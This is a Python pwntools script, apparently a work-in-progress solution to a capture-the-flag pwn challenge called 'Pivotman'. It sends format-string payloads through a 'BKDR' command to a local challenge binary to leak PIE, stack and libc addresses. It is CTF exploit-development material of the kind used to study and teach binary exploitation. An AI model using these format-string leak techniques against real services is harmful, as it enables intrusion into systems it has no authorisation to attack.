#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

CHALL_DIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Pivotman/pwn_pivotman/challenge'
ELF_PATH = f'{CHALL_DIR}/chall'
LD_PATH = f'{CHALL_DIR}/ld-linux-x86-64.so.2'

elf = ELF(ELF_PATH)

p = process([LD_PATH, ELF_PATH], cwd=CHALL_DIR)

p.recvuntil(b' \r\n', timeout=5)
p.sendline(b'USER ;)')
p.recvuntil(b' \r\n')
p.sendline(b'PASS ;)')
p.recvuntil(b' \r\n')

# Leak PIE first
p.sendline(b'BKDR %2737$p.%2736$p')
resp = p.recvuntil(b' \r\n')
log.info(f'Leak: {resp}')
marker = b' BKDR '
idx = resp.find(marker)
after = resp[idx + len(marker):]
parts = after.split(b'.')
pie_leak = int(parts[0], 16)
stack_leak = int(parts[1], 16)
pie_base = pie_leak - 0x3a10
saved_rbp = stack_leak
log.info(f'PIE base: {hex(pie_base)}')
log.info(f'saved_rbp: {hex(saved_rbp)}')

# Now try libc leak
puts_got = pie_base + 0x5ed8
log.info(f'puts@GOT: {hex(puts_got)}')

# Test: just send the address and see if the program survives
# The proper payload: BKDR %1032$sA + p64(puts_got)
payload = b'BKDR %1032$sA' + p64(puts_got)
log.info(f'Payload hex: {payload.hex()}')
log.info(f'Payload len: {len(payload)}')
p.sendline(payload)

try:
    resp = p.recvuntil(b' \r\n', timeout=5)
    log.info(f'Libc leak: {resp}')
except:
    log.error('No response - program may have crashed')
    # Try another approach: see what's left
    try:
        remaining = p.recv(timeout=1)
        log.info(f'Remaining data: {remaining}')
    except:
        log.error('Nothing remaining')

p.close()
